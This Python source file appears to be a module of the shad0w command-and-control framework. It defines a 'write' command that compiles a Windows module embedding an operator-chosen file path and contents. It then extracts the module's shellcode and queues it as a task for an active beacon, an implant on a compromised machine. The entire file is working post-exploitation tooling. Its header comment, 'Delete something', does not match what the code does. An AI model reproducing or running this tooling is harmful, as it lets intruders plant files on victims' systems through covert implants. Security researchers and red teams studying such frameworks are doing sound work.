# 
# Delete something
# 

import argparse

from lib import buildtools

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def main(shad0w, args):

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # usage examples
    usage_examples = """
Example:

write -f "C:\\Users\\thejoker\\writetome.txt" -d "i am going to be written"
"""
    
    parse = argparse.ArgumentParser(prog='write',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-f", "--file", required=True, help="Name of the file you want to write to")
    parse.add_argument("-d", "--data", nargs="*", required=True, help="Data you want to write to the file")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    if not (args.file and args.data):
        if ERROR:
            print(error_list)
            parse.print_help()
            return

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/write/", builddir="/root/shad0w/modules/windows/write/build")

    # set the correct settings
    filename = ''.join(args.file).replace('"', '').replace('\\', '\\\\')
    data = ' '.join(args.data).replace('"', '').replace('\\', '\\\\')

    template = "LPCSTR szFileName = \"%s\";\nLPCSTR* wData = \"%s\";" % (filename, data)

    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/write/build/settings.h")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/write/build", modlocation="/root/shad0w/modules/windows/write/module.exe")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/write/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)